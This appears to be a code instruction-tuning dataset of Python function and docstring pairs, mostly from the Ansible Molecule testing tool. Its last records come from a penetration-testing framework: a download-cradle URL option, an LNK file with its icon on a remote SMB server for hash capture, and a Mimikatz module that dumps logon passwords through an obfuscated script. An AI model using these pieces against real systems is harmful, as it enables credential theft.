{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbake a fle8 command so it s ready to execute and returns None.", "response": "def bake(self):\n        \"\"\"\n        Bake a `flake8` command so it's ready to execute and returns None.\n\n        :return: None\n        \"\"\"\n        self._flake8_command = sh.flake8.bake(\n            self.options,\n            self._tests,\n            _env=self.env,\n            _out=LOG.out,\n            _err=LOG.error)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprepare the system for using ansible - galaxy and returns None.", "response": "def _setup(self):\n        \"\"\"\n        Prepare the system for using ``ansible-galaxy`` and returns None.\n\n        :return: None\n        \"\"\"\n        role_directory = os.path.join(self._config.scenario.directory,\n                                      self.options['roles-path'])\n        if not os.path.isdir(role_directory):\n            os.makedirs(role_directory)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nexecute a scenario in a new version of the application.", "response": "def converge(ctx, scenario_name, ansible_args):  # pragma: no cover\n    \"\"\"\n    Use the provisioner to configure instances (dependency, create, prepare\n    converge).\n    \"\"\"\n\n    args = ctx.obj.get('args')\n    subcommand = base._get_subcommand(__name__)\n    command_args = {\n        'subcommand': subcommand,\n    }\n\n    base.execute_cmdline_scenarios(scenario_name, args, command_args)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef execute(self):\n        self.print_info()\n        self._config.provisioner.converge()\n        self._config.state.change_state('converged', True)", "response": "Execute the actions necessary to perform a molecule converge and return None."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list containing all scenario objects.", "response": "def all(self):\n        \"\"\"\n        Return a list containing all scenario objects.\n\n        :return: list\n        \"\"\"\n        if self._scenario_name:\n            scenarios = self._filter_for_scenario()\n            self._verify()\n\n            return scenarios\n\n        scenarios = [c.scenario for c in self._configs]\n        scenarios.sort(key=lambda x: x.directory)\n        return scenarios"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nverify the specified scenario was found and returns None.", "response": "def _verify(self):\n        \"\"\"\n        Verify the specified scenario was found and returns None.\n\n        :return: None\n        \"\"\"\n        scenario_names = [c.scenario.name for c in self._configs]\n        if self._scenario_name not in scenario_names:\n            msg = (\"Scenario '{}' not found.  \"\n                   'Exiting.').format(self._scenario_name)\n            util.sysexit_with_message(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _filter_for_scenario(self):\n        return [\n            c.scenario for c in self._configs\n            if c.scenario.name == self._scenario_name\n        ]", "response": "Returns a list of the scenario that matches the provided scenario name and returns a\n            list."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_matrix(self):\n        return dict({\n            scenario.name: {\n                'check': scenario.check_sequence,\n                'cleanup': scenario.cleanup_sequence,\n                'converge': scenario.converge_sequence,\n                'create': scenario.create_sequence,\n                'dependency': scenario.dependency_sequence,\n                'destroy': scenario.destroy_sequence,\n                'idempotence': scenario.idempotence_sequence,\n                'lint': scenario.lint_sequence,\n                'prepare': scenario.prepare_sequence,\n                'side_effect': scenario.side_effect_sequence,\n                'syntax': scenario.syntax_sequence,\n                'test': scenario.test_sequence,\n                'verify': scenario.verify_sequence,\n            }\n            for scenario in self.all\n        })", "response": "Builds a matrix of scenarios with sequence to include and returns a\n        dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_logger(name=None):\n    logging.setLoggerClass(CustomLogger)\n\n    logger = logging.getLogger(name)\n    logger.setLevel(logging.DEBUG)\n\n    logger.addHandler(_get_info_handler())\n    logger.addHandler(_get_out_handler())\n    logger.addHandler(_get_warn_handler())\n    logger.addHandler(_get_error_handler())\n    logger.addHandler(_get_critical_handler())\n    logger.addHandler(_get_success_handler())\n    logger.propagate = False\n\n    return logger", "response": "Build a logger with the given name and returns the logger object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexecute the actions necessary to perform a molecule lint and return None.", "response": "def execute(self):\n        \"\"\"\n        Execute the actions necessary to perform a `molecule lint` and\n        returns None.\n\n        :return: None\n        \"\"\"\n        self.print_info()\n        linters = [\n            l for l in [\n                self._config.lint,\n                self._config.verifier.lint,\n                self._config.provisioner.lint,\n            ] if l\n        ]\n\n        for l in linters:\n            l.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef inventory(self):\n        dd = self._vivify()\n        for platform in self._config.platforms.instances:\n            for group in platform.get('groups', ['ungrouped']):\n                instance_name = platform['name']\n                connection_options = self.connection_options(instance_name)\n                molecule_vars = {\n                    'molecule_file':\n                    \"{{ lookup('env', 'MOLECULE_FILE') }}\",\n                    'molecule_ephemeral_directory':\n                    \"{{ lookup('env', 'MOLECULE_EPHEMERAL_DIRECTORY') }}\",\n                    'molecule_scenario_directory':\n                    \"{{ lookup('env', 'MOLECULE_SCENARIO_DIRECTORY') }}\",\n                    'molecule_yml':\n                    \"{{ lookup('file', molecule_file) | molecule_from_yaml }}\",\n                    'molecule_instance_config':\n                    \"{{ lookup('env', 'MOLECULE_INSTANCE_CONFIG') }}\",\n                    'molecule_no_log':\n                    \"{{ lookup('env', 'MOLECULE_NO_LOG') or not \"\n                    \"molecule_yml.provisioner.log|default(False) | bool }}\"\n                }\n\n                # All group\n                dd['all']['hosts'][instance_name] = connection_options\n                dd['all']['vars'] = molecule_vars\n                # Named group\n                dd[group]['hosts'][instance_name] = connection_options\n                dd[group]['vars'] = molecule_vars\n                # Ungrouped\n                dd['ungrouped']['vars'] = {}\n                # Children\n                for child_group in platform.get('children', []):\n                    dd[group]['children'][child_group]['hosts'][\n                        instance_name] = connection_options\n\n        return self._default_to_regular(dd)", "response": "Create an inventory structure and returns a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexecutes ansible - playbook against the cleanup playbook and returns None.", "response": "def cleanup(self):\n        \"\"\"\n        Executes `ansible-playbook` against the cleanup playbook and returns\n        None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.cleanup)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef converge(self, playbook=None, **kwargs):\n        if playbook is None:\n            pb = self._get_ansible_playbook(self.playbooks.converge, **kwargs)\n        else:\n            pb = self._get_ansible_playbook(playbook, **kwargs)\n\n        return pb.execute()", "response": "Executes an ansible - playbook against the converge playbook unless the a\n         playbook is specified otherwise returns a string."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef destroy(self):\n        pb = self._get_ansible_playbook(self.playbooks.destroy)\n        pb.execute()", "response": "Executes ansible - playbook against the destroy playbook and returns\n        None."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes ansible - playbook against the side_effect playbook and returns None.", "response": "def side_effect(self):\n        \"\"\"\n        Executes ``ansible-playbook`` against the side_effect playbook and\n        returns None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.side_effect)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nexecuting ansible - playbook against the create playbook and returns None.", "response": "def create(self):\n        \"\"\"\n        Executes ``ansible-playbook`` against the create playbook and returns\n        None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.create)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nexecuting ansible - playbook against the prepare playbook and returns None.", "response": "def prepare(self):\n        \"\"\"\n        Executes ``ansible-playbook`` against the prepare playbook and returns\n        None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.prepare)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes ansible - playbook against the converge playbook with the syntax - check flag. Returns None if the command fails.", "response": "def syntax(self):\n        \"\"\"\n        Executes ``ansible-playbook`` against the converge playbook with the\n        ``-syntax-check`` flag and returns None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.converge)\n        pb.add_cli_arg('syntax-check', True)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nexecute ansible - playbook against the verify playbook and returns None.", "response": "def verify(self):\n        \"\"\"\n        Executes ``ansible-playbook`` against the verify playbook and returns\n        None.\n\n        :return: None\n        \"\"\"\n        pb = self._get_ansible_playbook(self.playbooks.verify)\n        pb.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef write_config(self):\n        template = util.render_template(\n            self._get_config_template(), config_options=self.config_options)\n        util.write_file(self.config_file, template)", "response": "Writes the provisioner s config file to disk and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef manage_inventory(self):\n        self._write_inventory()\n        self._remove_vars()\n        if not self.links:\n            self._add_or_update_vars()\n        else:\n            self._link_or_update_vars()", "response": "Manages inventory for Ansible and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _add_or_update_vars(self):\n        # Create the hosts extra inventory source (only if not empty)\n        hosts_file = os.path.join(self.inventory_directory, 'hosts')\n        if self.hosts:\n            util.write_file(hosts_file, util.safe_dump(self.hosts))\n        # Create the host_vars and group_vars directories\n        for target in ['host_vars', 'group_vars']:\n            if target == 'host_vars':\n                vars_target = copy.deepcopy(self.host_vars)\n                for instance_name, _ in self.host_vars.items():\n                    if instance_name == 'localhost':\n                        instance_key = instance_name\n                    else:\n                        instance_key = instance_name\n\n                    vars_target[instance_key] = vars_target.pop(instance_name)\n\n            elif target == 'group_vars':\n                vars_target = self.group_vars\n\n            if vars_target:\n                target_vars_directory = os.path.join(self.inventory_directory,\n                                                     target)\n\n                if not os.path.isdir(util.abs_path(target_vars_directory)):\n                    os.mkdir(util.abs_path(target_vars_directory))\n\n                for target in vars_target.keys():\n                    target_var_content = vars_target[target]\n                    path = os.path.join(\n                        util.abs_path(target_vars_directory), target)\n                    util.write_file(path, util.safe_dump(target_var_content))", "response": "Adds or updates the host and group vars and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwriting the provisioner s inventory file to disk and returns None.", "response": "def _write_inventory(self):\n        \"\"\"\n        Writes the provisioner's inventory file to disk and returns None.\n\n        :return: None\n        \"\"\"\n        self._verify_inventory()\n\n        util.write_file(self.inventory_file, util.safe_dump(self.inventory))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _remove_vars(self):\n        for name in (\"hosts\", \"group_vars\", \"host_vars\"):\n            d = os.path.join(self.inventory_directory, name)\n            if os.path.islink(d) or os.path.isfile(d):\n                os.unlink(d)\n            elif os.path.isdir(d):\n                shutil.rmtree(d)", "response": "Removes hosts group_vars and hosts files and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate or updates the symlink to group_vars and returns None.", "response": "def _link_or_update_vars(self):\n        \"\"\"\n        Creates or updates the symlink to group_vars and returns None.\n\n        :returns: None\n        \"\"\"\n        for d, source in self.links.items():\n            target = os.path.join(self.inventory_directory, d)\n            source = os.path.join(self._config.scenario.directory, source)\n\n            if not os.path.exists(source):\n                msg = \"The source path '{}' does not exist.\".format(source)\n                util.sysexit_with_message(msg)\n            msg = \"Inventory {} linked to {}\".format(source, target)\n            LOG.info(msg)\n            os.symlink(source, target)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget an instance of AnsiblePlaybook and returns it.", "response": "def _get_ansible_playbook(self, playbook, **kwargs):\n        \"\"\"\n        Get an instance of AnsiblePlaybook and returns it.\n\n        :param playbook: A string containing an absolute path to a\n         provisioner's playbook.\n        :param kwargs: An optional keyword arguments.\n        :return: object\n        \"\"\"\n        return ansible_playbook.AnsiblePlaybook(playbook, self._config,\n                                                **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwalks the project directory for tests and returns a list.", "response": "def _get_files(self):\n        \"\"\"\n        Walk the project directory for tests and returns a list.\n\n        :return: list\n        \"\"\"\n        excludes = [\n            '.git',\n            '.tox',\n            '.vagrant',\n            '.venv',\n            os.path.basename(self._config.verifier.directory),\n        ]\n        generators = [\n            util.os_walk(self._config.project_directory, '*.yml', excludes),\n            util.os_walk(self._config.project_directory, '*.yaml', excludes),\n        ]\n\n        return [f for g in generators for f in g]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbake a yamllint command so it s ready to execute and returns None.", "response": "def bake(self):\n        \"\"\"\n        Bake a `yamllint` command so it's ready to execute and returns None.\n\n        :return: None\n        \"\"\"\n        self._yamllint_command = sh.yamllint.bake(\n            self.options,\n            self._tests,\n            _env=self.env,\n            _out=LOG.out,\n            _err=LOG.error)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nturns input into a native string if possible.", "response": "def str_if_nested_or_str(s):\n    \"\"\"Turn input into a native string if possible.\"\"\"\n    if isinstance(s, ALL_STRING_TYPES):\n        return str(s)\n    if isinstance(s, (list, tuple)):\n        return type(s)(map(str_if_nested_or_str, s))\n    if isinstance(s, (dict, )):\n        return stringify_dict_contents(s)\n    return s"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nturning dict keys and values into native strings.", "response": "def stringify_dict_contents(dct):\n    \"\"\"Turn dict keys and values into native strings.\"\"\"\n    return {\n        str_if_nested_or_str(k): str_if_nested_or_str(v)\n        for k, v in dct.items()\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new virtual environment.", "response": "def create(ctx, scenario_name, driver_name):  # pragma: no cover\n    \"\"\" Use the provisioner to start the instances. \"\"\"\n    args = ctx.obj.get('args')\n    subcommand = base._get_subcommand(__name__)\n    command_args = {\n        'subcommand': subcommand,\n        'driver_name': driver_name,\n    }\n\n    base.execute_cmdline_scenarios(scenario_name, args, command_args)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nexecute the actions necessary to perform a molecule create and return None.", "response": "def execute(self):\n        \"\"\"\n        Execute the actions necessary to perform a `molecule create` and\n        returns None.\n\n        :return: None\n        \"\"\"\n        self.print_info()\n        self._config.state.change_state('driver', self._config.driver.name)\n\n        if self._config.driver.delegated and not self._config.driver.managed:\n            msg = 'Skipping, instances are delegated.'\n            LOG.warn(msg)\n            return\n\n        if self._config.state.created:\n            msg = 'Skipping, instances already created.'\n            LOG.warn(msg)\n            return\n\n        self._config.provisioner.create()\n\n        self._config.state.change_state('created', True)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninitialize a new role from a Cookiecutter URL.", "response": "def template(ctx, url, no_input, role_name):  # pragma: no cover\n    \"\"\" Initialize a new role from a Cookiecutter URL. \"\"\"\n    command_args = {\n        'role_name': role_name,\n        'subcommand': __name__,\n        'url': url,\n        'no_input': no_input,\n    }\n\n    t = Template(command_args)\n    t.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef execute(self):\n\n        role_name = self._command_args['role_name']\n        url = self._command_args['url']\n        no_input = self._command_args['no_input']\n        role_directory = os.getcwd()\n        msg = 'Initializing new role {}...'.format(role_name)\n        LOG.info(msg)\n\n        if os.path.isdir(role_name):\n            msg = ('The directory {} exists. '\n                   'Cannot create new role.').format(role_name)\n            util.sysexit_with_message(msg)\n\n        cookiecutter.main.cookiecutter(\n            url,\n            extra_context=self._command_args,\n            no_input=no_input,\n        )\n\n        role_directory = os.path.join(os.getcwd(), role_name)\n        msg = 'Initialized role in {} successfully.'.format(role_directory)\n        LOG.success(msg)", "response": "Execute the actions necessary to perform a molecule init template and return None."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef execute(self):\n        self.print_info()\n\n        if (self._config.state.prepared\n                and not self._config.command_args.get('force')):\n            msg = 'Skipping, instances already prepared.'\n            LOG.warn(msg)\n            return\n\n        if not self._config.provisioner.playbooks.prepare:\n            msg = 'Skipping, prepare playbook not configured.'\n            LOG.warn(msg)\n            return\n\n        self._config.provisioner.prepare()\n        self._config.state.change_state('prepared', True)", "response": "Execute the actions necessary to prepare the instances and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchanging the state of the given key and the provided value.", "response": "def change_state(self, key, value):\n        \"\"\"\n        Changes the state of the instance data with the given\n        ``key`` and the provided ``value``.\n\n        Wrapping with a decorator is probably not necessary.\n\n        :param key: A ``str`` containing the key to update\n        :param value: A value to change the ``key`` to\n        :return: None\n        \"\"\"\n        if key not in VALID_KEYS:\n            raise InvalidState\n        self._data[key] = value"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bake(self):\n        command_list = self.command.split(' ')\n        command, args = command_list[0], command_list[1:]\n\n        self._sh_command = getattr(sh, command)\n        # Reconstruct command with remaining args.\n        self._sh_command = self._sh_command.bake(\n            args, _env=self.env, _out=LOG.out, _err=LOG.error)", "response": "Bake a shell command so it s ready to execute and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbakes a rabocop command so it s ready to execute and returns None.", "response": "def bake(self):\n        \"\"\"\n        Bake a `rubocop` command so it's ready to execute and returns None.\n\n        :return: None\n        \"\"\"\n        self._rubocop_command = sh.rubocop.bake(\n            self.options,\n            self._tests,\n            _env=self.env,\n            _out=LOG.out,\n            _err=LOG.error)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nexecuting the actions necessary to perform a molecule destroy and return None.", "response": "def execute(self):\n        \"\"\"\n        Execute the actions necessary to perform a `molecule destroy` and\n        returns None.\n\n        :return: None\n        \"\"\"\n        self.print_info()\n\n        if self._config.command_args.get('destroy') == 'never':\n            msg = \"Skipping, '--destroy=never' requested.\"\n            LOG.warn(msg)\n            return\n\n        if self._config.driver.delegated and not self._config.driver.managed:\n            msg = 'Skipping, instances are delegated.'\n            LOG.warn(msg)\n            return\n\n        self._config.provisioner.destroy()\n        self._config.state.reset()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef from_yaml(data):\n    molecule_env_file = os.environ['MOLECULE_ENV_FILE']\n\n    env = os.environ.copy()\n    env = config.set_env_from_file(env, molecule_env_file)\n\n    i = interpolation.Interpolator(interpolation.TemplateWithDefaults, env)\n    interpolated_data = i.interpolate(data)\n\n    return util.safe_load(interpolated_data)", "response": "Interpolate the provided data and return a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef matrix(ctx, scenario_name, subcommand):  # pragma: no cover\n\n    args = ctx.obj.get('args')\n    command_args = {\n        'subcommand': subcommand,\n    }\n\n    s = scenarios.Scenarios(\n        base.get_configs(args, command_args), scenario_name)\n    s.print_matrix()", "response": "List matrix of steps used to test instances."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprocesses templates as found in the named directory.", "response": "def _process_templates(self,\n                           template_dir,\n                           extra_context,\n                           output_dir,\n                           overwrite=True):\n        \"\"\"\n        Process templates as found in the named directory.\n\n        :param template_dir: A string containing an absolute or relative path\n         to a directory where the templates are located. If the provided\n         directory is a relative path, it is resolved using a known location.\n        :param extra_context: A dict of values that are used to override\n         default or user specified values.\n        :param output_dir: An string with an absolute path to a directory where\n         the templates should be written to.\n        :param overwrite: An optional bool whether or not to overwrite existing\n         templates.\n        :return: None\n        \"\"\"\n        template_dir = self._resolve_template_dir(template_dir)\n        self._validate_template_dir(template_dir)\n\n        try:\n            cookiecutter.main.cookiecutter(\n                template_dir,\n                extra_context=extra_context,\n                output_dir=output_dir,\n                overwrite_if_exists=overwrite,\n                no_input=True,\n            )\n        except cookiecutter.exceptions.NonTemplatedInputDirException:\n            util.sysexit_with_message(\"The specified template directory (\" +\n                                      str(template_dir) +\n                                      \") is in an invalid format\")"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nredirecting the stdout to a log file.", "response": "def stdout_cm(self):\n        \"\"\" Redirect the stdout to a log file. \"\"\"\n        with open(self._get_stdout_log(), 'a+') as fh:\n            msg = '### {} ###\\n'.format(self._datetime)\n            fh.write(msg)\n            fh.flush()\n\n            yield fh"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nredirects the stderr to a log file.", "response": "def stderr_cm(self):\n        \"\"\" Redirect the stderr to a log file. \"\"\"\n        with open(self._get_stderr_log(), 'a+') as fh:\n            msg = '### {} ###\\n'.format(self._datetime)\n            fh.write(msg)\n            fh.flush()\n\n            try:\n                yield fh\n            except Exception as e:\n                self._has_error = True\n                fh.write(e.message)\n                fh.flush()\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncollect the instances state and returns a list of Status objects.", "response": "def status(self):\n        \"\"\"\n        Collects the instances state and returns a list.\n\n        .. important::\n\n            Molecule assumes all instances were created successfully by\n            Ansible, otherwise Ansible would return an error on create.  This\n            may prove to be a bad assumption.  However, configuring Molecule's\n            driver to match the options passed to the playbook may prove\n            difficult.  Especially in cases where the user is provisioning\n            instances off localhost.\n        :returns: list\n        \"\"\"\n        status_list = []\n        for platform in self._config.platforms.instances:\n            instance_name = platform['name']\n            driver_name = self.name\n            provisioner_name = self._config.provisioner.name\n            scenario_name = self._config.scenario.name\n\n            status_list.append(\n                Status(\n                    instance_name=instance_name,\n                    driver_name=driver_name,\n                    provisioner_name=provisioner_name,\n                    scenario_name=scenario_name,\n                    created=self._created(),\n                    converged=self._converged(),\n                ))\n\n        return status_list"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef prune(self):\n        LOG.info('Pruning extra files from scenario ephemeral directory')\n        safe_files = [\n            self.config.provisioner.config_file,\n            self.config.provisioner.inventory_file,\n            self.config.state.state_file,\n        ] + self.config.driver.safe_files\n        files = util.os_walk(self.ephemeral_directory, '*')\n        for f in files:\n            if not any(sf for sf in safe_files if fnmatch.fnmatch(f, sf)):\n                os.remove(f)\n\n        # Remove empty directories.\n        for dirpath, dirs, files in os.walk(\n                self.ephemeral_directory, topdown=False):\n            if not dirs and not files:\n                os.removedirs(dirpath)", "response": "Prune the scenario ephemeral directory files and returns None."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef sequence(self):\n        s = scenarios.Scenarios([self.config])\n        matrix = s._get_matrix()\n\n        try:\n            return matrix[self.name][self.config.subcommand]\n        except KeyError:\n            # TODO(retr0h): May change this handling in the future.\n            return []", "response": "Select the sequence based on the provided scenario and subcommand of the provided scenario object and returns a list."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprepare the scenario for Molecule and returns None.", "response": "def _setup(self):\n        \"\"\"\n         Prepare the scenario for Molecule and returns None.\n\n         :return: None\n         \"\"\"\n        if not os.path.isdir(self.inventory_directory):\n            os.makedirs(self.inventory_directory)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list(ctx, scenario_name, format):  # pragma: no cover\n    args = ctx.obj.get('args')\n    subcommand = base._get_subcommand(__name__)\n    command_args = {\n        'subcommand': subcommand,\n        'format': format,\n    }\n\n    statuses = []\n    s = scenarios.Scenarios(\n        base.get_configs(args, command_args), scenario_name)\n    for scenario in s:\n        statuses.extend(base.execute_subcommand(scenario.config, subcommand))\n\n    headers = [util.title(name) for name in status.get_status()._fields]\n    if format == 'simple' or format == 'plain':\n        table_format = 'simple'\n        if format == 'plain':\n            headers = []\n            table_format = format\n        _print_tabulate_data(headers, statuses, table_format)\n    else:\n        _print_yaml_data(headers, statuses)", "response": "Lists status of instances."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nprint the tabulate data on the screen and returns None.", "response": "def _print_tabulate_data(headers, data, table_format):  # pragma: no cover\n    \"\"\"\n    Shows the tabulate data on the screen and returns None.\n\n    :param headers: A list of column headers.\n    :param data:  A list of tabular data to display.\n    :returns: None\n    \"\"\"\n    print(tabulate.tabulate(data, headers, tablefmt=table_format))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ninitialize a new role for use with Molecule.", "response": "def role(ctx, dependency_name, driver_name, lint_name, provisioner_name,\n         role_name, verifier_name, template):  # pragma: no cover\n    \"\"\" Initialize a new role for use with Molecule. \"\"\"\n    command_args = {\n        'dependency_name': dependency_name,\n        'driver_name': driver_name,\n        'lint_name': lint_name,\n        'provisioner_name': provisioner_name,\n        'role_name': role_name,\n        'scenario_name': command_base.MOLECULE_DEFAULT_SCENARIO_NAME,\n        'subcommand': __name__,\n        'verifier_name': verifier_name,\n    }\n\n    if verifier_name == 'inspec':\n        command_args['verifier_lint_name'] = 'rubocop'\n\n    if verifier_name == 'goss':\n        command_args['verifier_lint_name'] = 'yamllint'\n\n    if verifier_name == 'ansible':\n        command_args['verifier_lint_name'] = 'ansible-lint'\n\n    if template is not None:\n        command_args['template'] = template\n\n    r = Role(command_args)\n    r.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes the actions necessary to perform a molecule init role and return None.", "response": "def execute(self):\n        \"\"\"\n        Execute the actions necessary to perform a `molecule init role` and\n        returns None.\n\n        :return: None\n        \"\"\"\n\n        role_name = self._command_args['role_name']\n        role_directory = os.getcwd()\n        msg = 'Initializing new role {}...'.format(role_name)\n        LOG.info(msg)\n\n        if os.path.isdir(role_name):\n            msg = ('The directory {} exists. '\n                   'Cannot create new role.').format(role_name)\n            util.sysexit_with_message(msg)\n\n        template_directory = ''\n        if 'template' in self._command_args.keys():\n            template_directory = self._command_args['template']\n        else:\n            template_directory = 'role'\n        self._process_templates(template_directory, self._command_args,\n                                role_directory)\n        scenario_base_directory = os.path.join(role_directory, role_name)\n        templates = [\n            'scenario/driver/{driver_name}'.format(**self._command_args),\n            'scenario/verifier/{verifier_name}'.format(**self._command_args),\n        ]\n        for template in templates:\n            self._process_templates(template, self._command_args,\n                                    scenario_base_directory)\n        self._process_templates('molecule', self._command_args, role_directory)\n\n        role_directory = os.path.join(role_directory, role_name)\n        msg = 'Initialized role in {} successfully.'.format(role_directory)\n        LOG.success(msg)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding a computer to the database if it does not already exist.", "response": "def add_computer(self, ip, hostname, domain, os, instances):\n        \"\"\"\n        Check if this host has already been added to the database, if not add it in.\n        \"\"\"\n        cur = self.conn.cursor()\n\n        cur.execute('SELECT * FROM computers WHERE ip LIKE ?', [ip])\n        results = cur.fetchall()\n\n        if not len(results):\n            cur.execute(\"INSERT INTO computers (ip, hostname, domain, os, instances) VALUES (?,?,?,?,?)\", [ip, hostname, domain, os, instances])\n\n        cur.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove_credentials(self, credIDs):\n        for credID in credIDs:\n            cur = self.conn.cursor()\n            cur.execute(\"DELETE FROM users WHERE id=?\", [credID])\n            cur.close()", "response": "Removes a credential ID from the database."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef options(self, context, module_options):\n        '''\n        URL  URL for the download cradle\n        '''\n\n        if not 'URL' in module_options:\n            context.log.error('URL option is required!')\n            exit(1)\n\n        self.url = module_options['URL']", "response": "Set the URL for the download cradle."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef options(self, context, module_options):\n        '''\n        SERVER        IP of the SMB server\n        NAME          LNK file name\n        CLEANUP       Cleanup (choices: True or False)\n        '''\n\n        self.cleanup = False\n\n        if 'CLEANUP' in module_options:\n            self.cleanup = bool(module_options['CLEANUP'])\n\n        if 'NAME' not in module_options:\n            context.log.error('NAME option is required!')\n            exit(1)\n\n        if not self.cleanup and 'SERVER' not in module_options:\n            context.log.error('SERVER option is required!')\n            exit(1)\n\n        self.lnk_name   = module_options['NAME']\n        self.lnk_path  = '/tmp/{}.lnk'.format(self.lnk_name)\n        self.file_path = ntpath.join('\\\\', '{}.lnk'.format(self.lnk_name))\n\n        if not self.cleanup:\n            self.server = module_options['SERVER']\n            link = pylnk.create(self.lnk_path)\n            link.icon = '\\\\\\\\{}\\\\icons\\\\icon.ico'.format(self.server)\n            link.save()", "response": "This function is called when the module is loaded from the command line."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting options for the Mimikatz process", "response": "def options(self, context, module_options):\n        '''\n           COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')\n        '''\n        self.command = 'privilege::debug sekurlsa::logonpasswords exit'\n        if module_options and 'COMMAND' in module_options:\n            self.command = module_options['COMMAND']\n\n        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-Mimikatz.ps1')"}
